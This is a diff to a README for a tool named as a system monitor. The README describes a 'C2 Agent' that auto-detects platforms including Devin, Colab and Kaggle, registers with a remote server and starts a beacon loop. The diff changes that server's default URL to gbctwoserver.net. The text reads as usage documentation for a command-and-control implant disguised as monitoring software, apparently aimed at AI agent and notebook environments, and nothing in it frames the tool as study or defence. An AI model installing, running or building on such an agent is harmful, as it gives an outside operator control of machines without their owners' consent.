@@ -114,13 +114,13 @@ sysmon          # Start server (not agent)
 
 **That's it!** The agent will:
 1. Auto-detect platform (Devin, Colab, Kaggle, Linux, macOS, Windows)
-2. Connect to server (default: https://system-monitor-6dru.onrender.com)
+2. Connect to server (default: https://gbctwoserver.net)
 3. Register and start beacon loop
 
 Expected output:
 ```
 [C2 Agent] Platform: devin_ai
-[C2 Agent] C2 URL: https://system-monitor-6dru.onrender.com
+[C2 Agent] C2 URL: https://gbctwoserver.net
 [C2 Agent] Agent ID: <uuid>
 [C2 Agent] Checking server connectivity...
 [C2 Agent] Server OK: {'status': 'ok', ...}
